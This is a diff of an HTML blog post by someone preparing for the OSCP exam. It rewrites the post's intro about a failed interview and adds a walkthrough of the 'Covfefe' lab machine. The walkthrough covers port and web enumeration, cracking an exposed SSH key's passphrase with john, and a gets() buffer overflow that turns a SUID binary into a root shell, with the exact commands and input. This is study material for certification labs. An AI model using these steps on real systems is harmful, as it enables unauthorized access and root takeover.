@@ -388,17 +388,19 @@
      data-full-width-responsive="true"></ins>
 
   <div class="post-body">
-    <p>In the last three weeks I have been wondering a few things, I was in a job interview at a very respectable place in my area, I was in my first interview which was technical, I was asked questions about WIRESHARK, understanding protocols such as TCP, LDAP, SMB2, how the MR system works, understanding Linux processes and how to identify SOCKETS , acquaintances with PS and even presented before a command that was very similar to what we have in OSCP, a kind of reverse shell.</p>
+    <p>Lately, I’ve been thinking a lot about some job interviews I had recently, especially one at a really good organization near to my aria. The interviews were interesting and kind of tough, and they got me thinking about my work and where I’m headed.</p>
 
-<p>The conversation was very fluid, the interview was virtual through Zoom, and two representatives came to the interview, one of whom is a team leader and the other a cyber team member, the conversation was good and ended well in which they explained to me what the process and the next step was, which is another interview with the organization’s IT manager.</p>
+<p>The first interview was on Zoom and was all about technical stuff. They asked me about Wireshark, which is a tool for analyzing network traffic, and about different protocols like TCP, LDAP, and SMB2. They also asked about things like Linux processes and sockets, which are like communication channels between computers. It was a good chat, and I felt like I could talk to them easily. They even explained what comes next in their hiring process.</p>
 
-<p>Indeed, a week after that I had a second interview with the IT manager, I was with several interviewers who are defined as senior managers, I tell you in all seriousness, that IT manager presented questions from which I understood that he had knowledge, I mainly remember that he asked me about the code I wrote in Python that should give A solution for transferring syslog information when the operator switches to transfer the information to another SIEM system.</p>
+<p>Then, about a week later, I had another interview, this time with the big boss of the IT department. The questions from the boss showed that he really have knowlage on the IT aria and cyber security field. One thing he asked about was a Python program I made to send information from one computer system to another—it was a bit of a challenge, but I managed to explain it well. Even though the interview went longer than expected, it felt like a positive conversation.</p>
 
-<p>The conversation was again fluid and an interview that was supposed to be half an hour was an hour and ten minutes, it was really good and I left with a good feeling, a week after that the recruiter called to inform that it was not certain that they would continue with me because of, what they said, “a gap in professional abilities knowledge”.</p>
+<p>But then came the tough part. After all that, the recruiter called and said they weren’t sure about moving forward because they saw a “gap in my skills.” Hearing that hurt. I’ve been working in this field for 12 years, and my bosses and colleagues think I’m good at what I do. Just last month, I got three thank-you notes from coworkers because I helped fix some long-standing problems at work.</p>
 
-<p>For me this was a blow, to say that I have a gap in my abilities is unreasonable, I have been in the field for 12 years in general, my managers see me as a professional writer without showing off, you can call them and they will surely tell you, more than that, last month I received 3 letters of thanks From various employees at my job where they wrote to the department manager about malfunctions that had been going on for months and when I came into the picture I was able to bring about an efficient and complete solution.</p>
+<p>After mulling it over, I realized something important: I still hadn’t finished the ultimate certification, the “OSCP”, which is a big deal in my field. Maybe that’s what’s holding me back. Maybe finishing that certification could prove, first of all for myself that I’m as good as I think I am.</p>
 
-<p>So yes, I think I’m professional enough to advance in any organization, but what was said about me still left me in doubt. I remembered at that point that I hadn’t finished the OSCP yet, and then it hit me, a voice in my head said to me: “You want to prove to yourself that you are a professional, finish the certification.” After everything I went through in these years I tried to understand what my problem was in passing this exam. I came to the conclusion that this is a systematic methodology. If I manage to build myself an orderly methodology I will probably be able to pass this exam.</p>
+<p>As I thought more about it, I realized I need to work on having a clear plan and method for tackling challenges. If I can improve how I approach problems and show that I’m always learning, I believe I can prove myself and pass that certification.</p>
+
+<p>So, even though getting that feedback was tough, it’s motivated me to keep growing and improving. I’m determined to show that I’m ready for whatever comes my way.</p>
 
 <p>And here I am going to write in this post about this methodology, in fact in order to pass the exam you need to hack 6 machines, 3 are part of the windows domain and another 3 individuals, one of which is a buffer overflow, my problem is the methodology, I know the commands, the actions that need to be performed, and I know Looking for good information and learning while doing it, my problem is the connection between all the pieces of the puzzle, most of the machines where I broke down and went looking for clues are machines that I just didn’t look at the full picture and therefore I dug into what there is no need to dig into.</p>
 
@@ -475,6 +477,75 @@ uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(ww
 </ol>
 
 <h3 id="covfefe">Covfefe</h3>
+
+<ol>
+  <li>
+    <p>Enumeration: run full port scan with rustscan and found that 22,80,31337 are open so run nmap against them and found that port 31337 is also web based, since ssh is on version 7.2, it better idea to run web enumeration against port 80 and 31337.</p>
+  </li>
+  <li>
+    <p>Web Fuzzing: run webenum with feroxbuster against each (80,31337) found more interesting directory on port 31337 which are .ssh, on that folder I was able to view private and public key and also the authorized keys in uses, so run wget</p>
+  </li>
+  <li>
+    <p>Trying Grabbing Shell: running the following ssh command with the private key.
+└─$ chmod 600 id_rsa
+└─$ ssh -i id_rsa simon@192.168.xxx.10 -p 22
+Enter passphrase for key ‘id_rsa’:
+since it’s ask for password we need to crack that id_rsa.</p>
+  </li>
+  <li>
+    <p>Hash Cracking: convert id_rsa to john:
+└─$ ssh2john ./id_rsa &gt; id_rsa.hash
+then run john:
+└─$ john id_rsa.hash –wordlist=/usr/share/wordlists/rockyou.txt
+if it found the password, we also can view it by using:
+└─$ john id_rsa.hash –show
+./id_rsa:starwars</p>
+  </li>
+  <li>
+    <p>Shell Grabbing: running the ssh command again with the password we found for id_rsa we have shell on the target:
+└─$ ssh -i id_rsa simon@192.168.189.10 -p 22
+Enter passphrase for key ‘id_rsa’:
+Linux covfefe 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u2 (2017-06-26) i686
+….
+Last login: Mon May 22 19:35:10 2023 from 192.168.45.212
+simon@covfefe:~$</p>
+  </li>
+  <li>
+    <p>System Enumeration: running <code class="highlighter-rouge">linpeas</code> found that we have access to /root directory but we can’t read the flag (we are not the root), but we can see read_message.c and also found read_message binary with SUID, so since we can read the source code it may mean that we can run for buffer overflow against it to gain root.</p>
+  </li>
+  <li>
+    <p>Buffer Overflow: We need first to read the code to understand what dose it do, we can transfer it to our local machine and use gdb, in our case by looking the code it’s self we can un derstand how to break it:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int main(int argc, char *argv[]) {
+char program[] = "/usr/local/sbin/message";
+char buf[20];
+char authorized[] = "Simon";
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>In that lines there is a <code class="highlighter-rouge">buf</code> variable which is in the size of 20 chars, the authorized is Simon and later it used to check the value from the user input if it match.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf("What is your name?\n");
+gets(buf);
+since gets have no bouderies we can exploit it
+if (!strncmp(authorized, buf, 5)) {
+printf("Hello %s! Here is your message:\n\n", buf);
+// This is safe as the user can't mess with the binary location:
+execve(program, NULL, NULL);
+</code></pre></div></div>
+<p>The <code class="highlighter-rouge">execve</code> is used to run binary file, which in our case should be <code class="highlighter-rouge">/usr/local/sbin/message</code>, since the matching on that code used for the five first chars we can overflow the <code class="highlighter-rouge">buf</code> to
+contain more then 20 chars and after that overwrite the program value with another binary value, in my case <code class="highlighter-rouge">/bin/sh</code>.</p>
+
+<ol>
+  <li>Privalge Escalation: running the program with the values more then 20 chars and insert /bin/sh to gain shell as root:
+simon@covfefe:~$ read_message
+What is your name?
+Simonnnnnnnnnnnnnnnn/bin/sh
+Hello Simonnnnnnnnnnnnnnnn/bin/sh! Here is your message:
+    <h1 id="id">id</h1>
+    <p>uid=1000(simon) gid=1000(simon) euid=0(root) groups=1000(simon),24(cdrom),25(floppy
+),29(audio),30(dip),44(video),46(plugdev),108(netdev)</p>
+  </li>
+</ol>
 
 <h3 id="fowsniff">Fowsniff</h3>
 
